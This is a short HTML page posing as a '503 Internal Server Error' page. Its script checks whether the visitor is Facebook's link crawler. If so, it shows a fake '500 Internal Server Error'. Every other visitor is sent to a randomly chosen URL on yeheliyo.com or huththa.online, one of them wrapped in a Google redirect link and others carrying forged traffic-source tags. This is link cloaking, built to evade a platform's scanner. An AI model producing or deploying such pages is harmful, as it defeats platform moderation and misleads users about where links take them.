<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>503 Internal Server Error</title>
    <script>
        window.onload = function() {
            // Check the user agent
            const userAgent = navigator.userAgent;

            // Simulate checking for Facebook's crawler
            if (userAgent.includes('facebookexternalhit')) {
                // Simulate sending a 500 error response
                document.body.innerHTML = "<h1>500 Internal Server Error</h1>";
                return; // Stop further execution
            }

            // Otherwise, redirect to a random page
            const pages = [
                "https://www.google.lk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwiQz6LS4NWJAxWz3jgGHQ3aPN8QFnoECBcQAQ&url=https%3A%2F%2Fwww.yeheliyo.com%2F&usg=AOvVaw3gcfmB4avEUXhB9uYOM-kX&opi=89978449",
                "https://yeheliyo.com/Ceres/NexStar?utm_source=google&utm_medium=organic&utm_campaign=google_project",
                "https://yeheliyo.com/Ceres/Celestron/index.php?utm_source=pinterest&utm_medium=organic&utm_campaign=google_redirect",
                "https://yeheliyo.com/Ceres/Hubble-Space/?utm_source=facebook&utm_medium=organic&utm_campaign=facebook",
                "https://huththa.online/doodle/?utm_source=twitter&utm_medium=organic&utm_campaign=google_redirect"
            ];
            const randomPage = pages[Math.floor(Math.random() * pages.length)];
            window.location.href = randomPage;
        };
    </script>
</head>
<body>
</body>
</html>
